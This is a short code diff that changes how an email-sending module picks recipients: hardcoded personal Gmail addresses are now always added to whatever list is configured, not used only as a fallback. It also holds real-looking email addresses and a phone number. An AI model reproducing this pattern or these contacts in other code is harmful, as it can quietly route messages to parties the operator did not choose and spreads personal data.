@@ -1,6 +1,7 @@
-const defaultRecipients = [
-  'maamekrakuezoom@gmail.com',
+const requiredRecipients = [
+  'yachalhouse@gmail.com',
   'blackbird77ad@gmail.com',
+  'akofuaquantson85@gmail.com',
 ];
 
 const SUPPORT_PHONE = '0544600600';
@@ -22,7 +23,7 @@ function getRecipients() {
     .map((email) => email.trim())
     .filter(Boolean);
 
-  return configured.length > 0 ? configured : defaultRecipients;
+  return [...new Set([...configured, ...requiredRecipients])];
 }
 
 function getConfig() {
